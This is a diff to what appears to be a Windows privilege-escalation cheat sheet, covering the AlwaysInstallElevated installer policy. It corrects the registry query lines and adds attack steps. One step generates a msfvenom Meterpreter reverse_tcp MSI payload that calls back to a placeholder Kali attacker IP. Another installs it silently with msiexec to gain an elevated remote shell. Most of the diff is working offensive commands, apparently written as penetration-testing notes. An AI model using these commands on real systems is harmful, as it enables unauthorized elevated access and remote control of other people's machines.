@@ -90,8 +90,12 @@ sc qc service name
 ````
 ### AlwaysInstallElevated << IF 64 bits use:  %SystemRoot%\Sysnative\reg.exe  
 ````
-reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated  
-reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated  
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\
+
+Check for AlwaysInstallElevated = 1 , if yes create a msfvenom msi payload 
+msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f msi -o setup.msi
+msiexec /quiet /qn /i C:\Temp\setup.msi
 ````
 ### Service only available from inside  
 ````
